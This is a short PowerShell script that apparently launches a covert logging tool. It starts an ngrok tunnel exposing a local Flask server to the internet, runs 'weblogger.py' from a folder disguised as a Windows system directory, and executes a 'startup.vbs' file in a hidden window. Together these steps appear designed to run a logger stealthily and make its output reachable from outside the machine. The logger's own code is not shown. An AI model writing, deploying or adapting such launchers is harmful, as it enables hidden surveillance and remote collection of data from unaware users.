# Define the port number for Flask web server
$flaskPort = 5000

# Define the path to weblogger.py file
$webloggerPath = "C:\Program Files (x86)\winX32\src\weblogger.py"

# Define the command to execute ngrok
$ngrokCommand = "ngrok http $flaskPort"

# Define the command to execute weblogger.py
$webloggerCommand = "python '$webloggerPath'"

# Start ngrok as a background job
Write-Output "Starting Ngrok..."
Start-Job -ScriptBlock { Invoke-Expression -Command $using:ngrokCommand}

# Start weblogger.py
Write-Output "Starting weblogger.py..."
Invoke-Expression -Command $webloggerCommand 

# Execute the execute.vbs script using cscript.exe
$vbsStartUpFilePath = "C:\Program Files (x86)\winX32\startup.vbs"
Start-Process cscript.exe -ArgumentList "//B //Nologo $vbsStartUpFilePath" -WindowStyle Hidden -Wait
